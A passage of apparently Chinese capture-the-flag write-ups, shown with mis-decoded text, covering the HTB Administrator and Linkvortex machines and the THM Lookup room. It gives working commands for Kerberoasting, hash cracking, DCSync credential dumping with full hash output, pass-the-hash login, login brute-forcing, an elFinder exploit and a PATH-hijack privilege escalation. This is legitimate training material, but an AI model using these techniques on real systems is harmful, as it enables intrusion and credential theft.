'benjamin'\n```\n\nä¿®æ”¹å®Œæˆåï¼Œå‘ç°ä¸èƒ½ä½¿ç”¨evil-winrmç™»å½•\n\n![image-20241210161619525](Administrator/image-20241210161619525.png)\n\n### benjamin-ftp\n\nç»è¿‡å°è¯•ï¼Œå‘ç°å¯ä»¥ç™»å½•ä¸Šbenjaminç”¨æˆ·çš„ftpæœåŠ¡å™¨\n\n![image-20241210161757497](Administrator/image-20241210161757497.png)\n\næœ‰ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥\n\n```shell\nftp> binary #åˆ‡æ¢è‡³äºŒè¿›åˆ¶ä¼ è¾“\n200 Type set to I.\nftp> get Backup.psafe3\n```\n\nè®©æˆ‘åº·åº·æ˜¯æ€ä¹ˆä¸ªäº‹\n\n![image-20241210162234104](Administrator/image-20241210162234104.png)\n\nå¯„ï¼Œæ˜¯ä¸€å›¢ä¹±ç \n\n## pwsafeç ´è§£\n\næŸ¥é˜…åç¼€å¯çŸ¥ï¼Œpsafe3æ˜¯è¢«åŠ å¯†è¿‡åçš„æ–‡ä»¶æ ¼å¼ï¼Œéœ€è¦ç”¨åˆ°pwsafeæ¥æ‰“å¼€\n\n![image-20241210162507949](Administrator/image-20241210162507949.png)\n\nè¶ç€ä¸‹è½½çš„åŠŸå¤«ï¼Œå…ˆçˆ†ç ´ä¸€ä¸‹æ–‡ä»¶çš„å¯†ç ï¼Œåœ¨hashcat wikiä¸­èƒ½å¤ŸçŸ¥é“æ¨¡å¼ä¸º5200\n\n![image-20241210162911722](Administrator/image-20241210162911722.png)\n\n```cmd\nhashcat.exe -m 5200 Backup.psafe3 rockyou.txt\n```\n\nå¾—åˆ°å‡­è¯**Backup.psafe3:tekieromucho**\n\næŠŠæ–‡ä»¶å’Œå¯†ç ä¸¢è¿›pwsafeåï¼Œèƒ½å¾—åˆ°emilyç”¨æˆ·çš„å¯†ç ï¼š**UXLCI5iETUsIBoFVTj8yQFKoHjXmb**ï¼ˆè¯è¯´è¿™è½¯ä»¶ç«Ÿç„¶ä¸èƒ½æˆªå±ï¼Œå¤åˆ¶å¯†ç ä¹Ÿä¸ä¼šåœ¨å‰ªåˆ‡æ¿ä¸­æ˜¾ç¤ºï¼‰\n\nç™»å½•æ‹¿åˆ°user.txt\n\n### emily->ethan\n\nè€æ ·å­ï¼Œemilyå¯¹ethanæœ‰GenericWriteæƒé™\n\n![image-20241212090718858](Administrator/image-20241212090718858.png)\n\nä½†æ˜¯è¿™ä¸ªç‚¹è²Œä¼¼ä¸èƒ½åˆ©ç”¨\n\n**Kerberoastingæ”»å‡»**\n\nåœ¨KerberoséªŒè¯ä¸­ï¼Œç”¨æˆ·ä½¿ç”¨è‡ªå·±çš„SPNç¥¨æ®è¿›è¡ŒéªŒè¯ï¼Œè¿™äº›ç¥¨æ®é€šå¸¸ä½¿ç”¨NTLMå“ˆå¸ŒåŠ å¯†ç”Ÿæˆï¼Œåªè¦ç”¨æˆ·æ³¨å†Œäº†SPNï¼Œå°±å¯ä»¥ä½¿ç”¨GetUserSPNsè·å¾—åŠ å¯†çš„NTLMï¼Œè§£å¯†åå°±èƒ½å¾—åˆ°hashå€¼\n\nåˆ©ç”¨GenericWriteæƒé™ç»™ethanç”¨æˆ·æ·»åŠ SPN\n\nå·¥å…·é“¾æ¥ï¼šhttps://github.com/ShutdownRepo/targetedKerberoast\n\n```python\npython ../../Tools/Windows-AD/targetedKerberoast-main/targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'\n\n[*] Starting kerberoast attacks\n[*] Fetching usernames from Active Directory with LDAP\n[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\n```\n\næ˜¾ç¤ºæ—¶é’ŸåŒæ­¥å‡ºç°é—®é¢˜ï¼ŒæŸ¥çœ‹ä¸æœåŠ¡å™¨æ—¶é—´ç›¸å·®å¤šå°‘\n\n```bash\nntpdig administrator.htb \n\n2024-12-12 17:26:18.180740 (+0800) +25200.186019 +/- 0.141181 administrator.htb 10.10.11.42 s1 no-leap\n```\n\nç›¸å·®7å°æ—¶ï¼Œé‚£å°±åœ¨å‘½ä»¤å‰ä½¿ç”¨faketimeæ¥æ›´æ”¹æ—¶é—´\n\n```python\nfaketime -f +7h python ../../Tools/Windows-AD/targetedKerberoast-main/targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' \n\n[*] Starting kerberoast attacks\n[*] Fetching usernames from Active Directory with LDAP\n[+] Printing hash for (ethan)\n$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b8636.....16744\n```\n\nä½¿ç”¨hashcatè§£å¯†\n\n![image-20241212103119140](Administrator/image-20241212103119140.png)\n\n```\nhashcat.exe -m 13100 $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b8636d03af5bd465bf41bdc8fa6709a8$dfd5d0b868efc35b4fbbde75433c0ed7383ee52c97fba5c3f3be482999495a458d6eee0695dd38512f24f1e5c898e8b96d422b0314a6c0344094edf9d1ee1d1a61bfffc1f0a5e215c265e1a7fef0282c98d4dd86106b19b60ce02b67f24115bfad3a092d7a762366eb688c7334171a9d24b5ccd589cf79d497fb1ab6ccf14f5d9bd725147c25b8f7a20c2603754b01d0a1e846a19430616806d179d6ea01ae125e3a2d3d912f7fb766c7c95ceca412ef42a78734107915acc8a2e0503bf993cdd1235a02d8e4d5665fe737ded52f8a4cd8febeb87725061c238c30d83d9eb089137fca2fa823092d458a8b541a92b439258a6c4bdb2aee22da0ef21040ba05ec90b878827b9dd310723f5ca5710b726b77dcca5e2efd9974070c9add53a0eb6d159eab5d4488f732f93c25c61530556a64c78083e6c518949822a13a74fe9c6d54fc58845039399b5e25d5aca8cde12a83482335e37f2cb2516ac6bcb00a0d6b757ef00fc5709d8db79845d379b73f2a4ce9f8ce010274180b3250eb1865f42782b28aed07673f763bad6260645d3fc82eabb6da9a798114255d73cb597f185315c727c5e287b258c1aa904c8b5bd138bab68563410da75a16d9dfd651d95e033488a722942c564b0196cd3a3bd50caf469c4016ef52738dea3ea2053c5c8bc6b0b15ae5933fefaab4c44f689ed89872bb1e56cfc9af4ea0a81e9ce75e98f91aefd90002a5aff649fd9d96c1de99e35d0d8c3af0ce4bcb5e785baae5c1fc8207a840eecd626d21bc7d6e428cbebb74e71d8a841217e0d2823631680f67937d102175555953031b19549302522e6f056c07e71debe4ef89c64aafeb8ddcf10bdacaa3e89b6f8dc54de79978b1fd09bc3741d7207418e21ebab5eb4ed82ece2b0e5843feab41386d4866157e7fc23ea5664e682e0ea0ca50790bf9ecddc49213e5b681ffa7151fa33ef526a895921519702669c3537a6bedfe7eedc5dfb08a34798c55887c6dbe4bb0d820f5b8163e2b632e224a5a074188dfb6b8c2e7ab2e31d6c52adc123fdf9c108394054216be12e2ba59e3ccd9b45bc3c146e812f3070f75d2a4eeea0cd356e2e349ebe05977f6bd1d96df3d1265961e10a582ed10bc04887340b458b8044cc0e58df9a149943f5ade853d62d113a0fd4f466e073f1e7b7201e966dab0e3bb737b725b5abbb7322985accffc1977505c02b1f71bcd712fd27927ae8c04be888d42ecec9f95cf94cf4374423e481414e8757c91cb97ac5e383a20ebccf8334769b6d87781c70364c7ffc5862961ae54e9d2f1e3942f7b3eafcc29f59d554be2e06a59ea6a2439bf6e4a3bcc6c211f71b9abfa6e1726f2253b414a8f1d291fbb02e44410eafc988ebdb9db2ad96f401ca383627d57839dc7347d20fd496fe4b1bcf2b4ed7dbcb7f392f10a2c5e9f546f2352ae1da1dfd20f17fd12a613411ed225a8864da6c080469088e2503798efef0f04b7f2be65536a624f910db581a1c0000e126843dd39140aa4567606c27af05b136f4674216744 rockyou.txt\n```\n\nè§£å¾—å¯†ç ä¸º**limpbizkit**\n\n## DCSync\n\n### ethan->administrator\n\nethanç”¨æˆ·å¯¹administratorå…·æœ‰DCSyncæƒé™ï¼Œè¿™å°±ç®€å•äº†ï¼Œç›´æ¥secretsdump\n\n![image-20241212103553580](Administrator/image-20241212103553580.png)\n\n```bash\nimpacket-secretsdump ethan:limpbizkit@10.10.11.42\n\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::\nadministrator.htb\\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::\nadministrator.htb\\michael:1109:aad3b435b51404eeaad3b435b51404ee:8864a202387fccd97844b924072e1467:::\nadministrator.htb\\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:95687598bfb05cd32eaa2831e0ae6850:::\nadministrator.htb\\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::\nadministrator.htb\\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::\nadministrator.htb\\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::\nadministrator.htb\\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::\nDC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664\nAdministrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2\nAdministrator:des-cbc-md5:403286f7cdf18385\nkrbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648\nkrbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94\nkrbtgt:des-cbc-md5:2c0bc7d0250dbfc7\nadministrator.htb\\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3\nadministrator.htb\\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48\nadministrator.htb\\olivia:des-cbc-md5:bc2a4a7929c198e9\nadministrator.htb\\michael:aes256-cts-hmac-sha1-96:b360c36cb6777b8cc3d88ab1aa60f0064e6ea4fc9b9a4ebacf66345118c0e959\nadministrator.htb\\michael:aes128-cts-hmac-sha1-96:bc3c8269d1a4a82dc55563519f16de8b\nadministrator.htb\\michael:des-cbc-md5:43c2bc231598012a\nadministrator.htb\\benjamin:aes256-cts-hmac-sha1-96:a0bbafbc6a28ed32269e6a2cc2a0ccb35ac3d7314633815768f0518ebae6847f\nadministrator.htb\\benjamin:aes128-cts-hmac-sha1-96:426ca56d39fe628d47066fc3448b645e\nadministrator.htb\\benjamin:des-cbc-md5:b6f84a864376a4ad\nadministrator.htb\\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4\nadministrator.htb\\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218\nadministrator.htb\\emily:des-cbc-md5:804343fb6e0dbc51\nadministrator.htb\\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f\nadministrator.htb\\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f\nadministrator.htb\\ethan:des-cbc-md5:58387aef9d6754fb\nadministrator.htb\\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6\nadministrator.htb\\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade\nadministrator.htb\\alexander:des-cbc-md5:49ba9dcb6d07d0bf\nadministrator.htb\\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82\nadministrator.htb\\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e\nadministrator.htb\\emma:des-cbc-md5:3249fba89813ef5d\nDC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb\nDC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d\nDC$:des-cbc-md5:f483547c4325492a\n[*] Cleaning up...\n```\n\nå¾—åˆ°administratorçš„hashåç›´æ¥ç™»å½•\n\n```bash\nevil-winrm -i 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'\n```\n\n![image-20241212104002832](Administrator/image-20241212104002832.png)\n\næ‹¿åˆ°root.txt\n\n# ç›¸å…³çŸ¥è¯†ç‚¹\n\nWindowsåŸŸææƒå‘½ä»¤ï¼šhttps://offensive.run/index.html\n\næ¸—é€æµ‹è¯•åˆ©ç”¨ç‚¹å¤§å…¨ï¼šhttps://book.hacktricks.xyz/cn\n\npwsafeï¼šhttps://www.pwsafe.org/\n\nä¼ªé€ SPNï¼šhttps://github.com/ShutdownRepo/targetedKerberoast","tags":["HTB"]},{"title":"Lookup","url":"/2024/12/09/Lookup/","content":"\nTHMé¶åœºLookup\n\n<!--more-->\n\né“¾æ¥ï¼šhttps://tryhackme.com/r/room/lookup\n\nä¸»æœºï¼šLinux\n\néš¾åº¦ï¼šeasy\n\n# æ€»ä½“æ€è·¯ï¼šç«¯å£&ç›®å½•æ‰«æ->æš´åŠ›ç ´è§£->CVE-2019-9194->è·¯å¾„åŠ«æŒ->sudoææƒ\n\n## ç«¯å£&ç›®å½•æ‰«æ\n\n```bash\nnmap -sSVC lookup.thm\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-07 23:35 CST\nNmap scan report for localhost\nHost is up (0.39s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)\n|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)\n|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Did not follow redirect to http://lookup.thm\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\ndirsearch -u lookup.thm\n\n[23:50:13] 403 -  275B  - /.ht_wsr.txt                                      \n[23:50:13] 403 -  275B  - /.htaccess.bak1                                   \n[23:50:14] 403 -  275B  - /.htaccess.orig                                   \n[23:50:14] 403 -  275B  - /.htaccess.save\n[23:50:14] 403 -  275B  - /.htaccess_orig\n[23:50:14] 403 -  275B  - /.htaccess.sample\n[23:50:14] 403 -  275B  - /.htaccess_extra\n[23:50:14] 403 -  275B  - /.htaccessOLD                                     \n[23:50:14] 403 -  275B  - /.htaccess_sc\n[23:50:14] 403 -  275B  - /.html                                            \n[23:50:14] 403 -  275B  - /.htaccessOLD2\n[23:50:14] 403 -  275B  - /.htpasswds                                       \n[23:50:14] 403 -  275B  - /.htm\n[23:50:14] 403 -  275B  - /.htpasswd_test\n[23:50:14] 403 -  275B  - /.htaccessBAK                                     \n[23:50:14] 403 -  275B  - /.httr-oauth                                      \n[23:50:20] 403 -  275B  - /.php                                             \n[23:52:23] 200 -    1B  - /login.php                                        \n[23:53:10] 403 -  275B  - /server-status/                                   \n[23:53:10] 403 -  275B  - /server-status\n```\n\nç›®å‰æ¥çœ‹å°±ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå…ˆè¿›å»æŸ¥çœ‹\n\n![image-20241208000753433](Lookup/image-20241208000753433.png)\n\nå…ˆéšæœºå°è¯•å‡ ä¸ªç”¨æˆ·åå’Œå¯†ç \n\n![image-20241208001624631](Lookup/image-20241208001624631.png)\n\n![image-20241208001705303](Lookup/image-20241208001705303.png)\n\n## æš´åŠ›ç ´è§£\n\nå‘ç°ä»–çš„æŠ¥é”™ä¿¡æ¯ä¸ä¸€æ ·ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå…ˆçˆ†ç ´å‡ºå­˜åœ¨çš„ç”¨æˆ·å\n\n```bash\nffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=FUZZ&password=admin' -w /usr/share/seclists/Usernames/Names/names.txt -mc all -ic -fs 74 -t 100\n```\n\n![image-20241208001807501](Lookup/image-20241208001807501.png)\n\næœ‰adminå’Œjoseä¸¤ä¸ªç”¨æˆ·ï¼Œå†ä½¿ç”¨ffufçˆ†ç ´å…¶å¯†ç \n\n```\nffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&password=FUZZ' -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -mc all -ic -fs 62 -t 100\n```\n\n![image-20241208001952227](Lookup/image-20241208001952227.png)\n\nè·å¾—joseçš„å¯†ç ä¸º**password123**\n\nç™»å½•åå‘ç°å…¶å°†æˆ‘ä»¬è·³è½¬åˆ°äº†files.lookup.thmï¼Œè¿™é‡Œéœ€è¦å°†åŸŸååŠ å…¥hostsåæ‰èƒ½è®¿é—®\n\n![image-20241208002152507](Lookup/image-20241208002152507.png)\n\nè¿›æ¥åç•Œé¢é•¿è¿™æ ·â†“\n\n![image-20241208002316427](Lookup/image-20241208002316427.png)\n\n## CVE-2019-9194\n\næŸ¥é˜…åŠŸèƒ½ç‚¹åï¼Œå‘ç°äº†elFinderç‰ˆæœ¬ä¸º2.1.47ï¼Œåœ¨exploitDBä¸Šæœç´¢å…¶æ¼æ´\n\n![image-20241208002644071](Lookup/image-20241208002644071.png)\n\nå‘ç°å¯ä»¥ç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ¼æ´åˆ©ç”¨\n\n![image-20241208003934814](Lookup/image-20241208003934814.png)\n\né€‰æ‹©æ¨¡å—4ï¼Œè®¾ç½®å¥½å‚æ•°åexploit\n\n![image-20241208004002396](Lookup/image-20241208004002396.png)\n\næ–°å»ºä¸€ä¸ªshellï¼Œå°†å…¶è½¬å‘åˆ°æœ¬åœ°ï¼Œå¹¶ä¼˜åŒ–ç•Œé¢\n\n```python\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n\n![image-20241208004132158](Lookup/image-20241208004132158.png)\n\næŸ¥çœ‹æœ¬æœºå­˜åœ¨çš„ç”¨æˆ·\n\n```bash\ncat /etc/passwd\nls /home\n```\n\nå‘ç°å­˜åœ¨thinkç”¨æˆ·\n\næŸ¥çœ‹å½“å‰ç”¨æˆ·èƒ½å¤Ÿè¿è¡Œçš„æ–‡ä»¶\n\n```bash\nfind / -perm -u=s 2>/dev/null\n\n/snap/snapd/19457/usr/lib/snapd/snap-confine\n...\n/usr/sbin/pwm\n/usr/bin/at\n/usr/bin/fusermount\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/pkexec\n/usr/bin/umount\n```\n\nå…¶ä¸­/usr/sbin/pwmè¾ƒä¸ºå¯ç–‘ï¼Œè¿è¡Œå®ƒ\n\n![image-20241208004642640](Lookup/image-20241208004642640.png)\n\næç¤ºè¯´/home/www-data/.passwordså¹¶ä¸å­˜åœ¨ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“ï¼Œhomeç›®å½•ä¸‹åªæœ‰thinkç”¨æˆ·ï¼Œä¸”å…¶ä¸­æœ‰.passwordsæ–‡ä»¶\n\n![image-20241208005019423](Lookup/image-20241208005019423.png)\n\n## è·¯å¾„åŠ«æŒ\n\nè¿™é‡Œå°è¯•ä½¿ç”¨è·¯å¾„åŠ«æŒï¼Œå°†idå‘½ä»¤çš„è¾“å‡ºä¿®æ”¹ä¸ºthinkï¼Œç„¶åå°†å…¶è·¯å¾„ä¿®æ”¹åˆ°tmpç›®å½•ä¸‹\n\n```bash\ncd /tmp\necho -e '#!/bin/bash\\necho \"uid=33(think) gid=33(www-data) groups=33(www-data)\"' > /tmp/id\nchmod 777 /tmp/id\nexport PATH=/tmp:$PATH\necho $PATH\n```\n\n![image-20241208005300763](Lookup/image-20241208005300763.png)\n\nå¯ä»¥çœ‹åˆ°æ‰§è¡Œå®Œæ¯•åï¼Œä½¿ç”¨idå‘½ä»¤è¾“å‡ºçš„å³ä¸ºthinkç”¨æˆ·\n\nå†æ¬¡è¿è¡Œpwmï¼Œè¾“å‡ºäº†è®¸å¤šè¡Œå¯†ç ï¼Œä¿å­˜ä¸‹æ¥ç”¨äºçˆ†ç ´thinkç”¨æˆ·å¯†ç \n\n```bash\nhydra -l think -P pass.txt lookup.thm ssh\n```\n\n![image-20241208005547902](Lookup/image-20241208005547902.png)\n\nå¯†ç ä¸º**josemario.AKA(think)**\n\nç™»å½•åˆ°SSH\n\næŸ¥çœ‹å½“å‰ç”¨æˆ·å¯æ‰§è¡Œæƒé™\n\n![image-20241208005842964](Lookup/image-20241208005842964.png)\n\n## sudoææƒ\n\nèƒ½å¤Ÿä»¥ä»»ä½•ç”¨æˆ·æ‰§è¡Œlookå‘½ä»¤ï¼Œåœ¨[GTFOBins](https://gtfobins.github.io/)ä¸ŠæŸ¥çœ‹ææƒå‘½ä»¤\n\n![image-20241208005942627](Lookup/image-20241208005942627.png)\n\nè¿™é‡Œå¯ä»¥é€‰æ‹©ç›´æ¥è¯»root.txtï¼Œä¹Ÿå¯ä»¥é€‰æ‹©è¯»id_rsa\n\n![image-20241208010131169](Lookup/image-20241208010131169.png)\n\nä½¿ç”¨id_rsaç™»å½•åˆ°rootç”¨æˆ·\n\n![image-20241208010242750](Lookup/image-20241208010242750.png)","tags":["THM"]},{"title":"Linkvortex","url":"/2024/12/09/Linkvortex/","content":"\né¶åœºåœ°å€ï¼šhttps://app.hackthebox.com/machines/LinkVortex\n\nä¸»æœºï¼šLinux\n\néš¾åº¦ï¼šeasy\n\n# æ€»ä½“æ€è·¯ï¼šç«¯å£&ç›®å½•&å­åŸŸåæ‰«æ->.gitæ–‡ä»¶æ³„éœ²->CVE-2023-40028->è„šæœ¬åˆ©ç”¨\n\n## ç«¯å£&ç›®å½•&å­åŸŸåæ‰«æ\n\n```bash\nnmap -sSVC linkvortex.htb\n\nStarting Nmap 7.94SVN ( https://nmap.org )\nNmap scan report for linkvortex.htb\nHost is up (0.53s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)\n|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)\n80/tcp open  http    Apache httpd\n| http-robots.txt: 4 disallowed entries \n|_/ghost/ /p/ /email/ /r/\n|_http-server-header: Apache\n|_http-title: BitByBit Hardware\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\ndirsearch -u http://linkvortex.htb\n\nTarget: http://linkvortex.htb/\n[11:52:45] Starting: \n[11:52:51] 404 -    7KB - /%3f/                                             \n[11:52:52] 404 -    7KB - /..;/                                             \n[11:52:52] 404 -    7KB - /.admin/                                          \n[11:52:52] 404 -    7KB - /.ansible/                                        \n[11:52:52] 404 -    7KB - /.apt_generated/                                  \n[11:52:52] 404 -    7KB - /.aws/                                            \n[11:52:53] 404 -    7KB - /.build/                                          \n[11:52:53] 404 -    7KB - /.buildpath/\n...\n[11:55:32] 404 -    7KB - /root/                                            \n[11:55:31] 200 -  103B  - /robots.txt                                       \n[11:55:32] 404 -    7KB - /rpc/                                             \n...\nTask Completed\n\nffuf -w /usr/share/wordlists/seclists/Discovery/DNS/shubs-subdomains.txt -H \"Host:FUZZ.linkvortex.htb\" -u \"http://linkvortex.htb\" -c -t 64 -fs 230\n\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://linkvortex.htb\n :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/shubs-subdomains.txt\n :: Header           : Host: FUZZ.linkvortex.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 64\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 230\n________________________________________________\n\ndev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 1423ms]\n```\n\nç›®æ ‡åªå¼€æ”¾äº†22å’Œ80ç«¯å£ä»¥åŠå­˜åœ¨å­åŸŸådevï¼Œ80ç«¯å£æœ‰ä¸€ä¸ªrobots.txtï¼Œå…ˆå»çœ‹çœ‹\n\n![Linkvortex/image-20241208131227227](Linkvortex/image-20241208131227227.png)\n\nè®¿é—®ä¸€ä¸‹ghost\n\n![Linkvortex/image-20241208131611772](Linkvortex/image-20241208131611772.png)\n\n~~ä¹…è¿çš„~~ç™»é™†ç•Œé¢\n\nå…ˆéšæ„è¾“å…¥ä¸€ä¸ªé‚®ç®±\n\n![Linkvortex/image-20241208131903692](Linkvortex/image-20241208131903692.png)\n\næç¤ºemailä¸å­˜åœ¨ï¼ŒçŒœæµ‹ç®¡ç†å‘˜é‚®ç®±\n\n![Linkvortex/image-20241208131941781](Linkvortex/image-20241208131941781.png)\n\nï¼ˆä¸€çŒœä¸€ä¸ªå‡†å‘ï¼‰\n\nè¿™é‡Œå¿˜è®°å¯†ç ä¹Ÿä¸ç®¡ç”¨ï¼ŒæŸ¥çœ‹devç•Œé¢\n\n![Linkvortex/image-20241208133811107](Linkvortex/image-20241208133811107.png)\n\næ˜¾ç¤ºæ­£åœ¨å¼€å‘ä¸­ï¼Œå¯¹å…¶ç›®å½•æ‰«æä¸€é\n\n```bash\nTarget: http://dev.linkvortex.htb/\n[12:05:56] Starting:\n[12:06:09] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/        \n[12:06:09] 200 -  620B  - /.git/hooks/                                      \n[12:06:09] 200 -   41B  - /.git/HEAD\n[12:06:09] 200 -  201B  - /.git/config\n[12:06:09] 200 -   73B  - /.git/description\n[12:06:09] 200 -  557B  - /.git/                                            \n[12:06:09] 200 -  402B  - /.git/info/                                       \n[12:06:09] 200 -  240B  - /.git/info/exclude\n[12:06:09] 200 -  401B  - /.git/logs/\n[12:06:09] 200 -  175B  - /.git/logs/HEAD                                   \n[12:06:09] 200 -  418B  - /.git/objects/                                    \n[12:06:09] 200 -  147B  - /.git/packed-refs\n[12:06:10] 200 -  393B  - /.git/refs/                                       \n[12:06:10] 301 -  249B  - /.git/refs/tags  ->  http://dev.linkvortex.htb/.git/refs/tags/\n[12:06:15] 403 -  199B  - /.ht_wsr.txt                                      \n[12:06:16] 403 -  199B  - /.htaccess.sample                                 \n[12:06:16] 403 -  199B  - /.htaccess.save\n[12:06:16] 403 -  199B  - /.htaccess.bak1\n[12:06:16] 403 -  199B  - /.htaccess_orig\n[12:06:16] 403 -  199B  - /.html\n[12:06:16] 403 -  199B  - /.htaccess.orig\n[12:06:16] 403 -  199B  - /.htaccessOLD\n[12:06:16] 403 -  199B  - /.htaccess_sc                                     \n[12:06:16] 403 -  199B  - /.htm                                             \n[12:06:16] 403 -  199B  - /.htaccess_extra\n[12:06:16] 403 -  199B  - /.htaccessOLD2                                    \n[12:06:16] 403 -  199B  - /.htaccessBAK\n[12:06:17] 403 -  199B  - /.htpasswd_test                                   \n[12:06:17] 403 -  199B  - /.htpasswds\n[12:06:17] 403 -  199B  - /.httr-oauth                                      \n[12:06:18] 200 -  691KB - /.git/index                                       \n[12:07:22] 403 -  199B  - /cgi-bin/                                         \n[12:08:43] 403 -  199B  - /server-status                                    \n[12:08:43] 403 -  199B  - /server-status/                                                                   \nTask Completed\n```\n\nå‘ç°æœ‰.gitæ–‡ä»¶æ³„éœ²\n\n## .gitæ–‡ä»¶æ³„éœ²\n\nä½¿ç”¨å·¥å…·ä¸‹è½½å…¶æ³„éœ²çš„æ–‡ä»¶\n\n```ptyhon\npython /git-dumper-master/git_dumper.py http://dev.linkvortex.htb /.git \n```\n\nåœ¨æ³„éœ²çš„æ–‡ä»¶/.git/ghost/core/test/regression/api/admin/authentication.test.jsä¸­ï¼Œæœ‰è‹¥å¹²ä¸ªå¯†ç 